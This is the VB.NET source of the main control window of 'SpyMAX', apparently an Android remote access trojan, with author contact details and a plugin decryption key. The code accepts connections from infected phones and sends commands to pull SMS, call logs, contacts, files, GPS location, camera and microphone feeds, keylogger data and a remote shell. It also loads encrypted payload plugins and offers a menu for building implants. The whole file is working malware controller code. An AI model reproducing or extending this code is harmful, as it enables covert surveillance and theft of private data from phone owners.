Imports System.ComponentModel
Public Class AngelAndroidForm

    'SpyMAX\created by scream
    'Sunday, 5 May 2019
    'skype:496
    'telegram:udpip
    'key plugens =spymax

    Public server As sockets.Accept

    Private RowsToolTip As ThemeToolTip

    Private BoxTitlePaintEventArgsWait As Boolean = False

    Private EventArgsActivated As Boolean = False

    Sub New()

        InitializeComponent()

        sockets.Data.angelform = Me

    End Sub
    Private Sub NotifyI()

        notfi.Icon = Me.Icon

        notfi.Visible = True

    End Sub

    Private Sub SpyStyle()

        BoxTitle.BackColor = SpySettings.DefaultColor_Background
        For Each gr As DataGridView In Me.Controls.OfType(Of DataGridView)()
            gr.BackgroundColor = SpySettings.DefaultColor_Background
            gr.BackColor = SpySettings.DefaultColor_Background
            gr.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background

            '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
            gr.CellBorderStyle = DataGridViewCellBorderStyle.SingleHorizontal
            gr.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
            gr.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground
            gr.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
            gr.GridColor = SpySettings.DefaultColor_Foreground
        Next
        Me.BackColor = SpySettings.DefaultColor_Background
    End Sub

    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub

    Private Function WaitServer() As Task
        While server Is Nothing
            Threading.Thread.Sleep(100)
        End While
        Return Nothing
    End Function

    Private Async Sub AngelAndroidForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Try

            Threading.ThreadPool.SetMaxThreads(250, 250)

            Threading.ThreadPool.SetMinThreads(250, 250)

            Dim identity = Security.Principal.WindowsIdentity.GetCurrent()

            Dim principal = New Security.Principal.WindowsPrincipal(identity)

            Dim isElevated As Boolean = principal.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator)

            If isElevated Then

                SpyStyle()

                Me.Icon = My.Resources.max

                DGV0.ColumnHeadersVisible = False

                Me.Text = String.Format("{0} - Administrator", reso.nameRAT)

                RowsToolTip = New ThemeToolTip

                Dim j As BegiinSend = New BegiinSend

                infoServer.RequestsSender = j

                Dim FileDirectory As New IO.DirectoryInfo(reso.res_Path & "\Plugins\Android")

                Dim plug As IO.FileInfo() = FileDirectory.GetFiles("*.pl")

                Dim plugExi As String() = "gen-1.pl,gen-2.pl,gen-3.pl,gen-4.pl,gen-5.pl,gen-6.pl,gen-7.pl,gen-8.pl".Split({","}, StringSplitOptions.None)

                Dim missing As Boolean = False

                For Each n In plugExi

                    Dim pathTest As String = String.Format("{0}\{1}", FileDirectory.FullName, n)

                    If Not IO.File.Exists(pathTest) Then

                        missing = True

                        MsgBox(String.Format("Missing :{0}", pathTest), MsgBoxStyle.Critical, reso.nameRAT)

                    End If

                Next

                If missing Then

                    FormEventArgsClosing()

                End If

                reso.plug = New List(Of Object)

                For Each File As IO.FileInfo In plug
                    Dim BY As Byte() = Codes.DE(IO.File.ReadAllBytes(File.FullName), "spymax")
                    Dim PU As Array = {reso.domen & "." & reso.Generals(File.Name.Substring(0, File.Name.LastIndexOf("."))), CStr(plug.Length), "rm -r ", "dex", BY, "ping -c 1 -W 15 "}
                    reso.plug.Add(PU)
                Next

                ''{
                'reso.plug = New List(Of Object)
                'For Each File As IO.FileInfo In plug
                '    Dim PU As Array = {reso.domen & "." & File.Name.Substring(0, File.Name.LastIndexOf(".")), CStr(plug.Length), "rm -r ", "dex", IO.File.ReadAllBytes(File.FullName), "ping -c 1 -W 15 "}
                '    reso.plug.Add(PU)
                'Next
                ''}



                If My.Settings._multi_sounds = "Yes" Then

                    Notif_Sound.multi = True

                Else

                    Notif_Sound.multi = False

                End If


                If IO.File.Exists(Notif_Sound.path_File) Then

                    Notif_Sound.aMedia = New System.Media.SoundPlayer

                    Notif_Sound.aMedia.SoundLocation = Notif_Sound.path_File

                    Notif_Sound.aMedia.Load()

                End If

                reso.maps = New System.Text.StringBuilder

                reso.maps.Append(IO.File.ReadAllText(reso.res_Path & "\Config\maps.inf"))

                Dim patGSM As String = reso.res_Path & "\Lib\LibGSM.dll"

                Try

                    reso.oAssembly = Reflection.Assembly.LoadFrom(patGSM)

                    For Each ty In reso.oAssembly.GetTypes

                        If ty.Name = "SpyMAX" Then

                            reso.oType = reso.oAssembly.GetType("LibGSM.SpyMAX")

                            reso.oObject = Activator.CreateInstance(reso.oType)

                        End If

                    Next

                Catch ex As Exception

                    If IO.File.Exists(patGSM) Then

                        GSMToolStripMenuItem.Visible = False

                    Else

                        MsgBox(ex.Message, MsgBoxStyle.Exclamation, reso.nameRAT)

                        GSMToolStripMenuItem.Visible = False

                    End If

                End Try

                Dim WinMM As String = reso.MY_Path & "WinMM.Net.dll"

                If Not IO.File.Exists(WinMM) Then

                    Throw New System.Exception("Missing :" & WinMM)

                End If


                If SpySettings.FLAGS_Visible = "No" Then
                    DGV0.Columns(5).Visible = False
                End If


                If SpySettings.SC_Status = "No" Then
                    DGV0.Columns(0).Visible = False
                End If


                Dim F0ntStyle As FontStyle = FontStyle.Regular
                Dim ttFont As String = "Hack-Regular.ttf"
                Select Case My.Settings.FontStyle
                    Case "Bold"
                        F0ntStyle = FontStyle.Bold
                        ttFont = "Hack-Bold.ttf"
                    Case "Regular"
                        F0ntStyle = FontStyle.Regular
                        ttFont = "Hack-Regular.ttf"
                End Select

                Dim F0ntSize As Integer = My.Settings.FontSize

                reso.f = CustomFont.LoadFont(ttFont, F0ntSize, F0ntStyle)

                reso.FontDrawString = CustomFontDrawString.LoadFont(ttFont, 11, F0ntStyle)

                reso.SupportedText = IO.File.ReadAllText(reso.res_Path & "\Config\supported_text.inf").ToLower

                reso.SupportedImages = IO.File.ReadAllText(reso.res_Path & "\Config\supported_images.inf").ToLower

                reso.SupportedVideo = IO.File.ReadAllText(reso.res_Path & "\Config\supported_video.inf").ToLower

                DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f

                DGV0.DefaultCellStyle.Font = reso.f

                Me.ctxMenu.Renderer = New ThemeToolStrip

                Me.ctxMu.Renderer = New ThemeToolStrip

                CType(CameraManagerToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False

                CType(CameraManagerToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ctxMenu.BackColor

                CType(LocationManagerToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False

                CType(LocationManagerToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ctxMenu.BackColor

                CType(ServerToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False

                CType(ServerToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ctxMenu.BackColor




                DGV0.AutoGenerateColumns = False
                Dim xcol As String = My.Settings._Columns
                For i As Integer = 0 To DGV0.Columns.Count - 1
                    DGV0.Columns(i).DisplayIndex = CInt(CStr(xcol.Chars(i)))
                Next




                Me.Show()

                Me.TOpacity.Interval = SpySettings.T_Interval

                Me.TOpacity.Enabled = True

                Dim p As New Ports

                p.StartPosition = FormStartPosition.Manual

                p.Location = Codes.FixSize(Me, p)

                Dim getPORT As String = Nothing

                Select Case p.ShowDialog(Me)

                    Case DialogResult.OK

                        getPORT = p._ports

                        My.Settings.ports = getPORT

                        My.Settings.Save()

                    Case Else

                        Me.Close()

                End Select

                Dim s As String() = getPORT.Split(":")
                Dim t As Threading.Thread = New Threading.Thread(Sub() server = New sockets.Accept(s))
                t.Start()

                Await Task.Factory.StartNew(Function() WaitServer(), TaskCreationOptions.None)


                TVW.Interval = 1000

                TVW.Enabled = True

                NotifyI()

                FilesManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                FilesManagerToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\folder.png")
                FilesManagerToolStripMenuItem.Tag = {0, "null", "null"}

                SMSManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                SMSManagerToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\sms.png")
                SMSManagerToolStripMenuItem.Tag = {0, "null", "null"}

                CallsManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                CallsManagerToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\calls.png")
                CallsManagerToolStripMenuItem.Tag = {0, "null", "null"}

                ContactsManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                ContactsManagerToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\contacts.png")
                ContactsManagerToolStripMenuItem.Tag = {0, "null", "null"}

                LocationManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                LocationManagerToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\location.png")
                LocationManagerToolStripMenuItem.Tag = {0, "null", "null"}

                AccountManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                AccountManagerToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\account.png")
                AccountManagerToolStripMenuItem.Tag = {0, "null", "null"}

                CameraManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                CameraManagerToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\camera.png")
                CameraManagerToolStripMenuItem.Tag = {0, "null", "null"}

                ShellTerminalToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                ShellTerminalToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\terminal.png")
                ShellTerminalToolStripMenuItem.Tag = {0, "null", "null"}

                MicrophoneToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                MicrophoneToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\microphone.png")
                MicrophoneToolStripMenuItem.Tag = {0, "null", "null"}

                ApplicationsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                ApplicationsToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\applications.png")
                ApplicationsToolStripMenuItem.Tag = {0, "null", "null"}

                InformationToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                InformationToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\info.png")
                InformationToolStripMenuItem.Tag = {0, "null", "null"}


                ServerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                ServerToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\server.png")
                ServerToolStripMenuItem.Tag = {0, "null", "null"}

                KeyloggerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                KeyloggerToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\keylogger.png")
                KeyloggerToolStripMenuItem.Tag = {0, "null", "null"}

                CallPhoneToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                CallPhoneToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\callphone.png")
                CallPhoneToolStripMenuItem.Tag = {0, "null", "null"}


                ClipboardToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
                ClipboardToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\clipboard.png")
                ClipboardToolStripMenuItem.Tag = {0, "null", "null"}

                reso.NewIcon(reso.res_Path & "\Icons\apk.ico", ".apk")

                BoxTitlePaintEventArgsWait = True

                If Not DGV0.ColumnHeadersVisible Then

                    DGV0.ColumnHeadersVisible = True

                End If

                If server.closing Then

                    Me.Close()

                Else

                    Try
                        Codes.AcquirePower()
                    Catch skip As Exception

                    End Try


                End If


            Else
                Dim startInfo As New ProcessStartInfo()
                Dim myprocess As New Process()
                startInfo.FileName = Application.ExecutablePath
                startInfo.Verb = "runas"
                myprocess.StartInfo = startInfo
                Try
                    myprocess.Start()
                Catch ex As Exception
                Finally
                    End
                End Try
            End If

        Catch ex As Exception

            MsgBox(String.Format("{0}", ex.Message), MsgBoxStyle.Critical, reso.nameRAT)

            FormEventArgsClosing()

        End Try


    End Sub

    Private Sub TVW_Tick(sender As Object, e As EventArgs) Handles TVW.Tick

        BoxTitle.Invalidate()

    End Sub

    Private Sub AngelAndroidForm_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing

        e.Cancel = True

        Dim xcol As String = ""

        For Each i In DGV0.Columns

            xcol &= CStr(i.DisplayIndex)

        Next

        My.Settings._Columns = xcol

        My.Settings.Save()

        FormEventArgsClosing()

    End Sub
    Private Sub FormEventArgsClosing()

        notfi.Visible = False

        TVW.Enabled = False

        If sockets.Data.nReport IsNot Nothing Then

            sockets.Data.nReport.Close()

        End If

        If server IsNot Nothing Then

            If Not server.closing Then

                For Each i In server.ListTcpListener

                    i.Stop()

                    i.Server.Close()

                Next

            End If

        End If

        Application.ExitThread()

        Application.Exit()


    End Sub
    Private Sub DGV0_KeyUp(sender As Object, e As KeyEventArgs) Handles DGV0.KeyUp
        If Not DGV0.AllowUserToOrderColumns = False Then
            DGV0.AllowUserToOrderColumns = False
        End If
    End Sub

    Private Sub DGV0_KeyDown(sender As Object, e As KeyEventArgs) Handles DGV0.KeyDown
        If e.Control Then
            If Not DGV0.AllowUserToOrderColumns = True Then
                DGV0.AllowUserToOrderColumns = True
            End If
        End If
    End Sub
    Private Sub DGV0_MouseUp(sender As Object, e As MouseEventArgs) Handles DGV0.MouseUp

        If RowsToolTip._ToolTip.Active = True Then

            RowsToolTip._ToolTip.Active = False

            RowsToolTip._ToolTip.Hide(DGV0)

        End If

    End Sub

    Private Sub DGV0_CellMouseUp(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DGV0.CellMouseUp

        If RowsToolTip._ToolTip.Active = True Then

            RowsToolTip._ToolTip.Active = False

            RowsToolTip._ToolTip.Hide(DGV0)

        End If

    End Sub

    Private Sub DGV0_CellMouseDown(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DGV0.CellMouseDown

        If e.Button = Windows.Forms.MouseButtons.Left Then

            RowsToolTip._ToolTip.RemoveAll()

            If DGV0.ShowCellToolTips = True Then DGV0.ShowCellToolTips = False

            If Not e.RowIndex = -1 And Not e.ColumnIndex = -1 Then

                If e.ColumnIndex = 0 Then

                    If RowsToolTip._ToolTip.Active = False Then

                        Dim obj As Object() = DGV0.Rows(e.RowIndex).Tag

                        If obj IsNot Nothing Then

                            Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                            If Not classClient Is Nothing Then

                                Dim getKEY As String() = classClient.Keys.Split(":")

                                If Not getKEY.Length >= infoServer.KeySize Then

                                    Return

                                End If

                                Dim mousePos As Point = PointToClient(MousePosition)

                                RowsToolTip._ToolTip.Active = True

                                Dim isHide As Boolean = getKEY(7).Chars(0) = "1"c

                                Dim isDOZE As Boolean = getKEY(7).Chars(1) = "1"c

                                'v1
                                Dim is_bind As Boolean = False

                                Try
                                    is_bind = getKEY(7).Chars(2) = "1"c
                                Catch ex As Exception

                                End Try

                                Dim is_MergeAdvanced As Boolean = False

                                Try
                                    is_MergeAdvanced = getKEY(7).Chars(3) = "1"c
                                Catch ex As Exception

                                End Try

                                Dim TipText As String = "#INFO" & vbNewLine _
                                & "Name:" & classClient.ClientName & vbNewLine _
                                & "From:" & classClient.Country & vbNewLine _
                                & "Host:" & getKEY(6) & vbNewLine _
                                & "Echo:" & classClient.Statistics & vbNewLine _
                                & "ip:" & getKEY(0) & vbNewLine _
                                & "Port:" & getKEY(1) & vbNewLine _
                                & "#INSTALLATION" & vbNewLine _
                                & "Hide:" & If(isHide, "yes", "no") & vbNewLine _
                                & "Doze:" & If(isDOZE, "yes", "no") & vbNewLine _
                                & "Bind:" & If(is_bind, "yes", "no") & vbNewLine _
                                & "M.A:" & If(is_MergeAdvanced, "yes", "no") & vbNewLine 'merge advanced
                                RowsToolTip._ToolTip.Show(TipText, DGV0, mousePos)

                            End If

                        End If

                    End If

                End If

            End If

        End If

    End Sub

    Private Sub CallsManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CallsManagerToolStripMenuItem.Click

        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".calls" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getCalls & sockets.Data.SPL_SOCKET & "calls", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try

    End Sub

    Private Sub ContactsManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ContactsManagerToolStripMenuItem.Click

        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getContacts & sockets.Data.SPL_SOCKET & "contacts", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try

    End Sub

    Private Sub Selected(ByVal v As String)

        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim handle As String = "Camera_Manager_" & classClient.ClientRemoteAddress

                        Dim CameraManager As CameraManager = My.Application.OpenForms(handle)

                        If CameraManager IsNot Nothing Then

                            CameraManager.Close()

                        End If


                        Dim spl As String() = classClient.Keys.Split(":")

                        If Not spl.Length >= infoServer.KeySize Then

                            Exit Do

                        End If

                        Dim chk0, chk1 As Integer
                        If SpySettings.AUTO_FOCUS = "Yes" Then
                            chk0 = 1
                        Else
                            chk0 = 0
                        End If
                        If SpySettings.CAM_Quality = "Auto" Then
                            chk1 = 1
                        Else
                            chk1 = 0
                        End If

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & v & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.getCamera & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try

    End Sub
    Private Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click

        Selected("0")

    End Sub
    Private Sub FrontToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FrontToolStripMenuItem.Click

        Selected("1")

    End Sub

    Private Sub FilesManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FilesManagerToolStripMenuItem.Click

        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get0", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try

    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MicrophoneToolStripMenuItem.Click

        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim handle As String = "Microphone_" & classClient.ClientRemoteAddress

                        Dim Microphone As Microphone = My.Application.OpenForms(handle)

                        If Microphone Is Nothing Then

                            Dim spl As String() = classClient.Keys.Split(":")

                            If Not spl.Length >= infoServer.KeySize Then

                                Exit Do

                            End If


                            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".microphone" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "start" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & "8000" & sockets.Data.SPL_DATA & SecurityKey.MicwaveOutByte & sockets.Data.SPL_DATA & classClient.ClientRemoteAddress & sockets.Data.SPL_DATA & "0", Codes.Encoding().GetBytes("null"), classClient}

                            classClient.Send(objs)

                        End If


                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub

    Private Sub ShellTerminalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShellTerminalToolStripMenuItem.Click
        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then


                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".terminal" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getCommand & sockets.Data.SPL_SOCKET & "run", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If


            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub

    Private Sub GSMToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GSMToolStripMenuItem.Click


        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs0 As Object() = {cClient, SecurityKey.KeysClient4 & sockets.Data.SPL_SOCKET, Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs0)

                        classClient.qitGPS = True

                        Dim objs1 As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getGSM & sockets.Data.SPL_SOCKET & "gsm", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs1)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try



    End Sub

    Private Sub GPSToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GPSToolStripMenuItem.Click


        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        classClient.qitGPS = False

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient3 & sockets.Data.SPL_SOCKET & sockets.Data.SPL_DATA & sockets.Data.SPL_SOCKET & SecurityKey.getGPS, Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try


    End Sub

    Private Sub SMSManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SMSManagerToolStripMenuItem.Click
        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".sms" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getSMS & sockets.Data.SPL_SOCKET & "sms" & sockets.Data.SPL_DATA & "content://sms/", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try

    End Sub

    Private Sub notfi_MouseClick(sender As Object, e As MouseEventArgs) Handles notfi.MouseClick

        If e.Button = MouseButtons.Left Then


            If Not Me.WindowState = FormWindowState.Normal Then

                Me.WindowState = FormWindowState.Normal

            End If

            Me.TopMost = True

            Me.TopMost = False

        End If

    End Sub
    Private S As Settings
    Private Sub SettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SettingsToolStripMenuItem.Click

        If S Is Nothing Then

            S = New Settings

            Select Case S.ShowDialog(Me)

                Case DialogResult.OK

                    S.Close()

                    S = Nothing

                Case Else

                    S.Close()

                    S = Nothing

            End Select

        End If

    End Sub
    Private A As About
    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click

        If A Is Nothing Then

            A = New About

            Select Case A.ShowDialog(Me)

                Case DialogResult.OK

                    A.Close()

                    A = Nothing

                Case Else

                    A.Close()

                    A = Nothing

            End Select

        End If



    End Sub
    Private B As Build
    Private Sub BuildToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuildToolStripMenuItem.Click

        If B Is Nothing Then

            B = New Build

            Select Case B.ShowDialog(Me)

                Case DialogResult.OK

                    B.Close()

                    B = Nothing

                Case Else

                    B.Close()

                    B = Nothing

            End Select

        End If


    End Sub
